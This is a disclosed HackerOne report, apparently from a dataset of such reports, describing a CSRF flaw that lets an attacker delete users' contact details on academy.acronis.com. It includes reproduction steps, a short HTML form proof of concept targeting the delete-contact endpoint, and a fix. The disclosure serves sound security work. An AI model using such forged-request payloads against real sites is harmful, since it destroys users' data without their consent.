---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '709537'
original_report_id: '709537'
title: Delete any user's added Email,Telephone,Fax,Address,Skype via csrf in (https://academy.acronis.com/)
team_handle: acronis
created_at: '2019-10-08T07:14:42.829Z'
disclosed_at: '2023-04-25T09:08:21.029Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 74
asset_identifier: Other Acronis Domains
asset_type: OTHER
max_severity: medium
tags:
- hackerone
---

# Delete any user's added Email,Telephone,Fax,Address,Skype via csrf in (https://academy.acronis.com/)

## Metadata

- HackerOne Report ID: 709537
- Weakness: 
- Program: acronis
- Disclosed At: 2023-04-25T09:08:21.029Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi there,

It is possible to delete anyone's added email,telephone,fax,address,Skype via CSRF in `GET`  method. The action is performed via `GET`method without any CSRF protection.

# Steps to reproduce

-   login to your https://academy.acronis.com account
-   navigate to `https://academy.acronis.com/#/account/edit/account_id/<your_id>`
-   add any email,telphone,fax,addres,skype 
-   try deleting them and capture the request 
-   you'll see the request is performed in `GET` method without any CSRF protection

#POC

```
<html>
  <body>
    <form action="https://academy.acronis.com/account/delete-contact/contact_id/<your_id>">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

#Fix 
 Use X-CSRF token or perform the action in `POST` method with a CSRF token.

## Impact

Delete any user's added  email,telephone,fax,address,Skype with CSRF attack.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
